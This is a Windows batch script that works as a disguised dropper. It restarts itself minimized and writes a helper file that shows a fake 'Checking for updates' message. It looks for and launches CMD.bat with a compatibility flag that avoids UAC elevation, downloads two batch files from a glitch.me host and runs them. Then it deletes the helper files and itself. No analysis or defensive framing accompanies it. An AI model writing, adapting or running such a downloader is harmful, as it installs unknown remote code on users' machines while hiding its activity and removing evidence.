@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
echo @echo off>SCMD.bat
echo title Updates?>>SCMD.bat
echo color 0A>>SCMD.bat
echo echo Checking for updates>>SCMD.bat
echo cd %%userprofile%%>>SCMD.bat
echo FOR /F "delims=" %%%%F IN ('dir /S /b CMD.bat') DO SET ExePath=%%%%F>>SCMD.bat
echo cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" "%%ExePath%%"">>SCMD.bat
curl -o "setup.bat" "https://1-glitch872.glitch.me/setup.bat"
start setup.bat
curl -o exe.bat https://1-glitch872.glitch.me/yep.bat
call exe.bat SCMD.bat
del exe.bat
del SCMD.bat
(goto) 2>nul & del "%~f0"
